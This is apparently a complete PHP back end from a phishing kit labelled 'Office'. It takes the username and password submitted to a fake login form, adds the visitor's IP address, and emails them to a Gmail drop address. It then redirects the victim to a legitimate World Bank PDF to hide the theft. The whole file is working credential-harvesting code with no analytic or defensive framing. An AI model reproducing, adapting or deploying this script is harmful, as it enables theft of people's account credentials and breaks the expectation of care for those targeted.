<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Office Tare_ama || :------\n";
$message .= "user: ".$_POST['user']."\n";
$message .= "Pass: ".$_POST['pass']."\n";
$message .= "----: || Tare_ama || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="smurdalaws@gmail.com";
$subject = "tare | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://openknowledge.worldbank.org/bitstream/handle/10986/25697/9781464809941.pdf");
?>